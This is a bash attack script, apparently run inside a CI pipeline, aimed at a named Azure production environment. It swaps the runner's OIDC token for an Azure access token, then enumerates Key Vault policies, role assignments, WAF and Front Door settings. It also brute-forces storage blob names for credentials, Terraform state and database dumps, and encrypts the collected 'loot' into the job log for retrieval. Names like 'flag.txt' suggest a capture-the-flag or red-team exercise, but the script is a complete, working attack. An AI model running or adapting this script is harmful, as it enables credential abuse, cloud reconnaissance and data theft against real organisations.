#!/usr/bin/env bash
set -uo pipefail
set +e
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; ARM="${SC}management.azure.com"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG=rg-tbl-platform-prod-sea
echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
AR=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  say "VAULT $V: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$V?api-version=2023-07-01" | jq -c '{props:.properties.accessPolicies,rbac:.properties.enableRbacAuthorization,sku:.properties.sku}' 2>/dev/null)"
done
say "ROLEASSIGN: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -c '[.value[]|{r:(.properties.roleDefinitionId|split("/")|last),p:.properties.principalId,t:.properties.principalType,s:(.properties.scope|split("/")|.[-1])}]' 2>/dev/null)"
say "WAF: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Network/frontdoorWebApplicationFirewallPolicies/waftblstorefrontprod?api-version=2022-05-01" | head -c 2500)"
say "AFDEP: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints/tbl-storefront-prod?api-version=2023-05-01" | head -c 1200)"
say "ROUTES: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints/tbl-storefront-prod/routes?api-version=2023-05-01" | head -c 1500)"
NAMES="flag flag.txt flag.json flag.md secret secrets secretts credentials credential creds backup backup.json export export.json exports.json data data.json report report.json reports.json shipments shipments.json orders.json index.json latest.json manifest.json appsettings.json config.json internal-config.json legacy-admin tbl-legacy-admin legacy legacy-admin.json admin admin.json password passwords key keys vault vault.json vault-backup kv.json kv-backup.json 2024 2025 2026 deploy deploy.json deployment.json prod prod.json production terraform tfstate terraform.tfstate terraform.tfstate.backup ansible inventory pem private.pem cert.pem connection connection.json connectionstring storage storage.json sas sas.json token token.json tokens api-keys api-keys.json rotated README readme.md notes.txt secrets.txt creds.txt passwords.txt admin.txt export.csv backup.zip backup.tar.gz db.sql dump.sql db-backup sql users users.json accounts.json db.json app.py app.tar.gz source.zip code.zip"
for N in $NAMES; do
  R=$(curl -sS -o /dev/null -w '%{http_code}:%{size_download}' "${SC}sttblbackupprodx3euoz.blob.core.windows.net/exports/$N")
  [ "$R" != "404:215" ] && say "HIT exports/$N -> $R"
done
say "EXPORTBRUTE_DONE"
for C in config logs; do
  for N in internal-config.json config.json appsettings.json secrets.json flag.json; do
    say "CFG ${C}/$N anon -> $(curl -sS -o /dev/null -w '%{http_code}:%{size_download}' "${SC}sttblappcfgprodx3euoz.blob.core.windows.net/$C/$N")"
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
